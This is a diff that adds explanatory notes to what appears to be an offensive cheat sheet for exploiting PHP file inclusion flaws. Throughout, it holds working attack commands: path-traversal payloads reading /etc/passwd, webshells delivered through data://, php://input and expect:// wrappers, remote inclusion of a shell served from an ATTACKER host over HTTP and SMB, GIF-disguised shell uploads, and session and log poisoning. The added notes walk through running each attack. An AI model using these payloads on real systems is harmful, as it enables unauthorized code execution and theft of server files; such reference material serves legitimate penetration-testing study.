@@ -10,6 +10,7 @@
 ?param=../../../../etc/passwd         # path traversal (4-8 levels)
 ?param=C:\Windows\boot.ini            # Windows
 ```
+> Swap `param` for the actual parameter name (e.g., `page`, `file`, `lang`). If the file contents appear in the response, Local File Inclusion (LFI) is confirmed. Increase the number of `../` sequences if deeper traversal is needed.
 
 If file contents appear in response → LFI confirmed.
 
@@ -92,7 +93,7 @@ If file contents appear in response → LFI confirmed.
 ```
 ?param=php://filter/read=convert.base64-encode/resource=FILE
 ```
-Decode base64 output with `echo 'OUTPUT' | base64 -d`.
+> Returns the PHP source code as base64 instead of executing it. Works even when an extension is appended. Decode with `echo 'OUTPUT' | base64 -d`.
 
 ### `data://` — Inline PHP (needs allow_url_include)
 ```bash
@@ -103,17 +104,20 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 # Trigger:
 curl "http://TARGET/?p=data://text/plain;base64,PD9waHA...&cmd=id"
 ```
+> Encodes a PHP webshell as base64 and delivers it inline via the `data://` wrapper. Requires `allow_url_include=On`. Replace the base64 string with your own encoded payload and set `cmd` to the command you want to run.
 
 ### `php://input` — POST Body as Code (needs allow_url_include)
 ```bash
 curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
   "http://TARGET/?p=php://input&cmd=id"
 ```
+> Sends PHP code in the POST body and includes it via `php://input`. Requires `allow_url_include=On`. The `cmd` parameter controls which OS command runs.
 
 ### `expect://` — Direct Command Exec (needs expect extension)
 ```bash
 curl "http://TARGET/?p=expect://id"
 ```
+> Runs a shell command directly through the `expect://` wrapper. Rarely enabled in production, but worth trying. Replace `id` with any command.
 
 ### `zip://` and `phar://` — Archive Tricks (LFI + file upload)
 ```bash
@@ -125,6 +129,7 @@ zip shell.jpg shell.php
 php --define phar.readonly=0 build_phar.php
 # include: phar://uploads/shell.phar/shell.txt
 ```
+> Package a PHP shell inside a ZIP or PHAR archive, upload it as an image, then include the inner file with `zip://` or `phar://`. The `%23` is a URL-encoded `#` separator for `zip://`.
 
 ---
 
@@ -144,6 +149,7 @@ curl "http://TARGET/?p=http://ATTACKER:8888/shell.php&cmd=id"
 impacket-smbserver -smb2support share /tmp/rfi
 # include: \\ATTACKER\share\shell.php
 ```
+> Creates a PHP webshell on your machine, serves it over HTTP, then triggers Remote File Inclusion (RFI) so the target downloads and executes it. The SMB method works on Windows when HTTP RFI is blocked. Replace `ATTACKER` with your tun0 IP.
 
 ---
 
@@ -161,6 +167,7 @@ curl -X POST "http://TARGET/upload" -F "file=@shell.gif"
 # 4. Trigger via LFI:
 curl "http://TARGET/?p=./uploads/shell.gif&cmd=id"
 ```
+> Hides a PHP shell inside a GIF by prepending the GIF magic bytes. Upload it as a profile image, then include it via LFI to execute it. Adjust the upload endpoint and path to match the target.
 
 ---
 
@@ -180,6 +187,8 @@ curl -b "PHPSESSID=$SID" \
 curl -b "PHPSESSID=$SID" \
   "http://TARGET/?p=/var/lib/php/sessions/sess_$SID&cmd=id"
 ```
+> Grabs the session ID from the response cookie, writes a PHP shell into the session parameter, then includes the session file via LFI to execute it. Re-poison before every command — each include overwrites the session value.
+
 > **Re-poison before every command** — including the session file overwrites the value.
 
 ### Apache/nginx Log Poisoning
@@ -192,6 +201,8 @@ curl "http://TARGET/?p=/var/log/apache2/access.log&c=id"
 # or for nginx:
 curl "http://TARGET/?p=/var/log/nginx/access.log&c=id"
 ```
+> Writes a PHP shell into the web server access log via the `User-Agent` header, then includes the log file through LFI. Use `\$` to prevent local shell variable expansion. Apache logs are often root-only; nginx logs are usually readable by `www-data`.
+
 > Apache access.log usually root-only on modern Debian. nginx logs usually `www-data` readable. Try both.
 
 ---
@@ -215,6 +226,7 @@ ffuf -w ~/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FU
 ffuf -w ~/SecLists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt:FUZZ \
      -u "http://TARGET/index.php?p=../../../../FUZZ" -fs BASELINE_SIZE
 ```
+> Step 1 discovers hidden GET parameters by fuzzing parameter names. Step 2 tries known LFI payloads against the vulnerable parameter. Step 3 finds the webroot path. Step 4 enumerates sensitive `/etc` files. Run Step 1 first to set `BASELINE_SIZE` from a normal response, then filter by that size with `-fs`.
 
 ---
 
